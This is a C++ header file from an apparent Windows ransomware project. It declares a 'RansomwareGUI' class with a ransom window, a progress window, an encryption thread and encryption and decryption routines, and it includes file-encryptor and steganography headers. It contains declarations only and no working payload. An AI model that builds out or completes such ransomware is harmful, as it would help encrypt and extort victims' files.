#pragma once

#include <Windows.h>
#include <string>
#include <thread>
#include <memory>
#include "../include/file_encryptor.h"
#include "crypto/steganography.h"
#include "constants.h"

class RansomwareGUI {
private:
    HWND mainWindow;
    HWND progressWindow;
    HWND ransomWindow;
    std::thread encryptionThread;
    bool encryptionComplete;
    bool decryptionComplete;

    static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
    static LRESULT CALLBACK ProgressWindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
    static LRESULT CALLBACK RansomWindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

    void CreateProgressWindow();
    void CreateRansomWindow();
    void RunEncryption();
    void RunDecryption();

public:
    RansomwareGUI();
    ~RansomwareGUI();
    void Run();
}; 